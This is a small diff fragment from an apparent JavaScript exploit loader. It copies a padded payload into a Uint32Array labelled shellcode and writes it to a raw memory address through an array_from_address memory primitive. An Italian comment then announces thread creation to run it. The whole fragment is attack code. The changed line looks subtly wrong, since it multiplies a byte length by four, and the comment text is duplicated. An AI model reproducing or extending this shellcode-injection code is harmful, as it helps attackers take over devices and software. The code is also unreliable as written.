@@ -1539,7 +1539,7 @@ async function loadPayload() {
         tmp.set(new Uint8Array(PLD), 0);
         tmp.set(padding, PLD.byteLength);
         const shellcode = new Uint32Array(tmp.buffer);
-        const pl = chain.array_from_address(payloadBuffer, shellcode.length * 4);
+        const pl = mem.array_from_address(payload_buffer, PLD.byteLength * 4);
         pl.set(shellcode);
 
         // 7. Creazione thread sicura Creazione thread sicura
